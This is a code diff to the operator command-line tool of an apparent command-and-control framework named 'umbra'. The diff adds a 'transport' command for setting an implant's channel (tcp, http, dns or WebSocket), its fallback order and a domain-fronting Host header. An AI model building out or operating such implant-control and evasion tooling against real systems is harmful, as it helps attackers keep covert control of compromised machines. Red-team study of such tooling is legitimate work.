@@ -24,7 +24,7 @@ from typing import Any, Dict, List, Optional
 
 from . import __version__, crypto, db, image, netio, wire
 from .client import CHUNK_MAX, OperatorClient, OperatorError
-from .vpn import print_pivots, print_vpn_peers, print_vpn_status
+from .vpn import _table, print_pivots, print_vpn_peers, print_vpn_status
 
 BANNER = r"""
   _   _ __  __ ___  ____      _    ____
@@ -1674,6 +1674,29 @@ def build_parser() -> argparse.ArgumentParser:
     pivot.add_argument("--password", default="",
                        help="the password the socks5 proxy asks for")
 
+    # -- the route of an agent -------------------------------------------
+    transport = sub.add_parser(
+        "transport",
+        help="the route of an agent: which transport it speaks, in which "
+             "order it may fall back",
+    )
+    transport.add_argument("action", choices=["set", "get", "list"],
+                           help="set the route of an agent, read one or list them all")
+    transport.add_argument("target", nargs="?", default="",
+                           help="agent id (set and get)")
+    transport.add_argument("--primary", default="",
+                           help="the transport the agent speaks first: tcp, http, dns or ws")
+    transport.add_argument("--fallback", default="",
+                           help="the order the agent may fall back in, comma separated")
+    transport.add_argument("--front", default="",
+                           help="the domain the agent puts in the Host header")
+    transport.add_argument("--inspect", action="store_true",
+                           help="the proxy in front of the agent reads the traffic")
+    transport.add_argument("--http-path", default="",
+                           help="the route of the HTTP transport")
+    transport.add_argument("--ws-path", default="",
+                           help="the route of the WebSocket transport")
+
     # -- layer-3 tunnel --------------------------------------------------
     vpn = sub.add_parser("vpn", help="the layer-3 tunnel between the implants and the server")
     vpn.add_argument("action", choices=["status", "peers", "allocate"])
@@ -2529,6 +2552,56 @@ def main(argv: Optional[List[str]] = None) -> int:
                     emit({"stream": args.target, "closed": True})
                 else:
                     print(f"closed {args.target}")
+        elif args.cmd == "transport":
+            if args.action == "list":
+                routes = client.transport_list()
+                if args.json:
+                    emit({"routes": routes})
+                else:
+                    rows = [
+                        [
+                            r.get("agent", "?"),
+                            r.get("primary", "?"),
+                            ",".join(r.get("fallback") or []) or "-",
+                            r.get("front", "") or "-",
+                            "yes" if r.get("inspect") else "no",
+                        ]
+                        for r in routes
+                    ]
+                    print(_table(
+                        ["AGENT", "PRIMARY", "FALLBACK", "FRONT", "INSPECT"], rows))
+            elif args.action == "get":
+                if not args.target:
+                    print("usage: umbra transport get <agent>", file=sys.stderr)
+                    return 2
+                route = client.transport_get(args.target)
+                if args.json:
+                    emit(route)
+                else:
+                    print(f"{route.get('agent')} speaks {route.get('primary')}"
+                          f" (fallback: {', '.join(route.get('fallback') or []) or '-'})"
+                          + (f", front {route.get('front')}" if route.get("front") else ""))
+            else:
+                if not args.target or not args.primary:
+                    print("usage: umbra transport set <agent> --primary <transport> "
+                          "[--fallback tcp,ws] [--front domain] [--inspect]",
+                          file=sys.stderr)
+                    return 2
+                fallback = [f.strip() for f in args.fallback.split(",") if f.strip()]
+                route = client.transport_set(
+                    args.target,
+                    primary=args.primary,
+                    fallback=fallback,
+                    front=args.front,
+                    inspect=args.inspect,
+                    http_path=args.http_path,
+                    ws_path=args.ws_path,
+                )
+                if args.json:
+                    emit(route)
+                else:
+                    print(f"{route.get('agent')} now speaks {route.get('primary')}"
+                          f" (fallback: {', '.join(route.get('fallback') or []) or '-'})")
         elif args.cmd == "vpn":
             if args.action == "status":
                 status = client.vpn_status()
